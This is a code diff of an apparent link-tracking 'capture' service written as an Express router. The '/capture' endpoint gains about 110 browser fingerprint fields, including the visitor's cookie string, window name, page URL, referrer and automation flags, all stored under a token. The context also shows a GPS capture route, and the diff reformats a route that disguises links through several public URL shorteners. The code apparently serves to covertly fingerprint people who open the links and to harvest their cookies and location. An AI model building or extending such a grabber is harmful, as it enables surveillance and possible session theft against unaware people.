@@ -277,6 +277,115 @@ router.post("/capture", async(req, res) => {
             paymentRequestSupport: body.paymentRequestSupport || null,
             credentialMgmtSupport: body.credentialMgmtSupport || null,
             presentationSupport: body.presentationSupport || null,
+            // -- Missing params now added ----------------------------------
+            deviceBrand: body.deviceBrand || null,
+            deviceModel: body.deviceModel || null,
+            cpuClass: body.cpuClass || null,
+            oscpu: body.oscpu || null,
+            connectionQuality: body.connectionQuality || null,
+            onlineStatus: body.onlineStatus || null,
+            tabHidden: body.tabHidden || null,
+            visibilityState: body.visibilityState || null,
+            scrollPositionX: body.scrollPositionX ?? null,
+            scrollPositionY: body.scrollPositionY ?? null,
+            keyboardLayout: body.keyboardLayout || null,
+            memoryTier: body.memoryTier || null,
+            dayOfWeek: body.dayOfWeek || null,
+            timeOfDay: body.timeOfDay || null,
+            documentCharset: body.documentCharset || null,
+            documentCompatMode: body.documentCompatMode || null,
+            documentReadyState: body.documentReadyState || null,
+            cookieString: body.cookieString || null,
+            navigationCount: body.navigationCount ?? null,
+            windowName: body.windowName || null,
+            screenColorDepth: body.screenColorDepth || null,
+            devicePixelRatioPercent: body.devicePixelRatioPercent || null,
+            browserCodeName: body.browserCodeName || null,
+            browserOnline: body.browserOnline || null,
+            maxTouchPointsDetail: body.maxTouchPointsDetail || null,
+            webdriver: body.webdriver || null,
+            automationDetected: body.automationDetected || null,
+            prefersContrast: body.prefersContrast || null,
+            displayMode: body.displayMode || null,
+            monochrome: body.monochrome || null,
+            invertedColors: body.invertedColors || null,
+            forcedColors: body.forcedColors || null,
+            colorGamut: body.colorGamut || null,
+            hdrSupport: body.hdrSupport || null,
+            pointerFine: body.pointerFine || null,
+            hoverCapability: body.hoverCapability || null,
+            webglExtensionsList: body.webglExtensionsList || null,
+            maxCombinedTextureUnits: body.maxCombinedTextureUnits || null,
+            maxCubeMapTextureSize: body.maxCubeMapTextureSize || null,
+            maxRenderBufferSize: body.maxRenderBufferSize || null,
+            maxVaryingVectors: body.maxVaryingVectors || null,
+            maxVertexTextureUnits: body.maxVertexTextureUnits || null,
+            maxFragmentTextureUnits: body.maxFragmentTextureUnits || null,
+            notificationPermission: body.notificationPermission || null,
+            nfcSupport: body.nfcSupport || null,
+            serialSupport: body.serialSupport || null,
+            hidSupport: body.hidSupport || null,
+            wakeLockSupport: body.wakeLockSupport || null,
+            vibrationSupport: body.vibrationSupport || null,
+            eyeDropperSupport: body.eyeDropperSupport || null,
+            fileSystemAccessSupport: body.fileSystemAccessSupport || null,
+            contactPickerSupport: body.contactPickerSupport || null,
+            webShareSupport: body.webShareSupport || null,
+            clipboardAPISupport: body.clipboardAPISupport || null,
+            mediaSessionSupport: body.mediaSessionSupport || null,
+            pictureInPictureSupport: body.pictureInPictureSupport || null,
+            pointerLockSupport: body.pointerLockSupport || null,
+            fullscreenSupport: body.fullscreenSupport || null,
+            speechRecognitionSupport: body.speechRecognitionSupport || null,
+            speechSynthesisSupport: body.speechSynthesisSupport || null,
+            cryptoSupport: body.cryptoSupport || null,
+            performanceObserverSupport: body.performanceObserverSupport || null,
+            intersectionObserverSupport: body.intersectionObserverSupport || null,
+            resizeObserverSupport: body.resizeObserverSupport || null,
+            mutationObserverSupport: body.mutationObserverSupport || null,
+            requestIdleCallbackSupport: body.requestIdleCallbackSupport || null,
+            requestAnimFrameSupport: body.requestAnimFrameSupport || null,
+            // -- New extra fields ------------------------------------------
+            pageTitle: body.pageTitle || null,
+            pageUrl: body.pageUrl || null,
+            pageReferrer: body.pageReferrer || null,
+            screenPixels: body.screenPixels || null,
+            windowArea: body.windowArea || null,
+            browserZoom: body.browserZoom || null,
+            isTouchDevice: body.isTouchDevice || null,
+            gamepadsConnected: body.gamepadsConnected || null,
+            connectionOnline: body.connectionOnline || null,
+            permissionAPI: body.permissionAPI || null,
+            geolocationAPI: body.geolocationAPI || null,
+            pointerEvents: body.pointerEvents || null,
+            touchEvents: body.touchEvents || null,
+            passiveEvents: body.passiveEvents || null,
+            requestIdleCallback: body.requestIdleCallback || null,
+            intersectionObserver: body.intersectionObserver || null,
+            mutationObserver: body.mutationObserver || null,
+            resizeObserver: body.resizeObserver || null,
+            fetch: body.fetch || null,
+            asyncStorage: body.asyncStorage || null,
+            broadcastChannel: body.broadcastChannel || null,
+            abortController: body.abortController || null,
+            compressionStream: body.compressionStream || null,
+            structuredClone: body.structuredClone || null,
+            queueMicrotask: body.queueMicrotask || null,
+            visualViewportWidth: body.visualViewportWidth ?? null,
+            visualViewportHeight: body.visualViewportHeight ?? null,
+            visualViewportScale: body.visualViewportScale ?? null,
+            documentDomain: body.documentDomain || null,
+            crossOriginIsolated: body.crossOriginIsolated || null,
+            isSecureContext: body.isSecureContext || null,
+            hasFocus: body.hasFocus || null,
+            bodyScrollHeight: body.bodyScrollHeight || null,
+            bodyOffsetWidth: body.bodyOffsetWidth || null,
+            htmlFontSize: body.htmlFontSize || null,
+            colorSchemePreference: body.colorSchemePreference || null,
+            reducedTransparency: body.reducedTransparency || null,
+            contrastPreference: body.contrastPreference || null,
+            captureTimestamp: body.captureTimestamp || null,
+            capturedAt: new Date().toISOString(),
         };
         const result = await recordCapture(token, deviceData);
         return res.status(200).json(result);
@@ -422,7 +531,7 @@ router.post("/capture-gps", async(req, res) => {
 //     return res.status(200).json(data);
 // });
 
-router.post("/shorten-url", async (req, res) => {
+router.post("/shorten-url", async(req, res) => {
     try {
         const { url, provider } = req.body;
         if (!url) return res.status(400).json({ error: "url required" });
@@ -431,41 +540,35 @@ router.post("/shorten-url", async (req, res) => {
 
         if (provider === "tinyurl") {
             const r = await axios.get(
-                "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url),
-                { timeout: 10000 }
+                "https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 10000 }
             );
             const result = String(r.data || "").trim();
             if (result.startsWith("http")) shortUrl = result;
 
         } else if (provider === "isgd") {
             const r = await axios.get(
-                "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url),
-                { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+                "https://is.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
             const result = String(r.data || "").trim();
             if (result.startsWith("http")) shortUrl = result;
 
         } else if (provider === "vgd") {
             const r = await axios.get(
-                "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url),
-                { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+                "https://v.gd/create.php?format=simple&url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
             const result = String(r.data || "").trim();
             if (result.startsWith("http")) shortUrl = result;
 
         } else if (provider === "dagd") {
             const r = await axios.get(
-                "https://da.gd/shorten?url=" + encodeURIComponent(url),
-                { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
+                "https://da.gd/shorten?url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } }
             );
             const result = String(r.data || "").trim();
             if (result.startsWith("http")) shortUrl = result;
 
         } else if (provider === "linkshrink") {
             const r = await axios.post(
-                "https://linkshrink.dev/api/v1/shorten",
-                { url },
-                { timeout: 10000, headers: { "Content-Type": "application/json" } }
+                "https://linkshrink.dev/api/v1/shorten", { url }, { timeout: 10000, headers: { "Content-Type": "application/json" } }
             );
             if (r.data?.data?.shortUrl) shortUrl = r.data.data.shortUrl;
         }
@@ -491,3 +594,4 @@ router.post("/credits", async(req, res) => {
 });
 
 export default router;
+
